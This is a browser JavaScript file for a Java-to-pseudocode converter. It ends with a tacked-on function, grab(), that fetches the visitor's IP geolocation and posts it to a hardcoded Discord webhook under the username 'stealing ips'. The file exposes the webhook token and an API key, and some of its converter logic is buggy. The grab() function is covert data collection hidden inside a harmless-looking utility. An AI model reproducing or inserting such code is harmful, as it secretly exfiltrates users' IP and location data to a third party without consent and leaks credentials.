input = document.getElementById("input");

input.addEventListener("input", convert);
var webhook = require("./config.json");

function convert() {
  var code = document.getElementById("input").value;
  var output = document.getElementById("output");
  var lines = code.split(/\r?\n/);
  var pseudo = "";
  var init = 0;
  var pseudoarr = [];
  var not = ["public", "private", "static", "void", "int", "string", "boolean"];
  var types = ["void", "int", "string", "Boolean"];
  var brackets = ["{", "}"];
  var ops = ["-", "+", "*", "/"];
  for (var i = 0; i < lines.length; i++) {
    var chars = lines[i].split("");
    var words = lines[i].split(" ");
    var trimmed = lines[i].trim();
    if (
      trimmed.startsWith("/") ||
      trimmed.startsWith("*") ||
      trimmed.includes("class") ||
      trimmed.includes("package") ||
      trimmed == "}" ||
      trimmed == "{"
    ) {
      lines.splice(i, 1);
      i--;
    } else if (
      (lines[i].includes("public") || lines[i].includes("private")) &&
      !lines[i].trim().includes("(")
    ) {
      words = lines[i].trim().split(" ");
      words.splice(0, 2);
      lines[i] = "";
      for (var j = 0; j < words.length; j++) {
        lines[i] += words[j] + " ";
      }
      pseudoarr.splice(init, 1, lines[i]);
      lines.splice(i, 1);
      i--;
      init++;
    } else if (
      (lines[i].includes("public") || lines[i].includes("private")) &&
      lines[i].includes("(")
    ) {
      var name;
      var type = "";
      var word = lines[i].trim().split("(");
      words = word[0].split(" ");
      for (var j = 0; j < words.length; j++) {
        if (types.includes(words[j].toLowerCase())) {
          type = words[j];
        }
        if (!not.includes(words[j].toLowerCase())) {
          name = words[j];
          word = word[1].split(")");
          input = word[0];
          break;
        }
      }
      if (type != "") {
        pseudoarr.push(
          "Method " + name + ":\n" + type + " " + name + "(" + input + ")"
        );
      } else {
        pseudoarr.push("Method " + name + ":\n" + name + "(" + input + ")");
      }
      lines.splice(i, 1);
      i -= 1;
    } else {
      for (var j = 0; j < brackets.length; j++) {
        if (lines[i].indexOf(brackets[j] !== -1) || lines[i].includes("=")) {
          for (var k = 0; k < chars.length; k++) {
            if (chars[k] == brackets[j]) {
              if (lines[i].includes("if")) {
                chars.splice(k, 1, "then");
              } else chars.splice(k, 1);
            }
            if (
              chars[k] == "=" &&
              chars[k - 1] != "=" &&
              !ops.includes(chars[k - 1])
            ) {
              chars[k] = "<-";
            }
          }

          lines[i] = "";
          for (var k = 0; k < chars.length; k++) {
            lines[i] += chars[k];
          }
        }
      }
      pseudoarr.push(lines[i]);
    }
  }

  for (var i = 0; i < pseudoarr.length; i++) {
    var space = pseudoarr[i].split(" ");
    if (pseudoarr[i].includes("<-<-")) {
      pseudoarr[i] = "";
      for (var j = 0; j < space.length; j++) {
        if (space[j] == "<-<-") space[j] = "=";
      }
      for (var j = 0; j < space.length; j++) {
        pseudoarr[i] += space[j] + " ";
      }
    }
  }
  for (var i = 0; i < pseudoarr.length; i++) {
    pseudo += pseudoarr[i] + "\n";
  }

  output.value = pseudo;

  if (code == "") output.value = "";
}

document.getElementById("input").addEventListener("keydown", function (e) {
  if (e.key == "Tab") {
    e.preventDefault();
    var beginning = this.selectionStart;
    var end = this.selectionEnd;
    this.value =
      this.value.substring(0, beginning) + "\t" + this.value.substring(end);

    this.selectionStart = this.selectionEnd = beginning + 1;
  }
});

function grab() {
  console.log("cock");
  var req = new XMLHttpRequest();
  req.open(
    "POST",
    "https://discord.com/api/webhooks/953364959495069836/cFJBDYv6G2mEO74lD_aiVSMDqyljn0YvqQebKvf6oG72c5nsyFCzjACXtA1KgdsH-d4w"
  );
  req.setRequestHeader("Content-type", "application/json");

  $.getJSON(
    "https://ipgeolocation.abstractapi.com/v1/?api_key=159b017772384f868853bf1904ea59d4",
    function (data) {
      var params = {
        username: "stealing ips",
        content: data,
      };
      req.send(JSON.stringify(params));
    }
  );
}
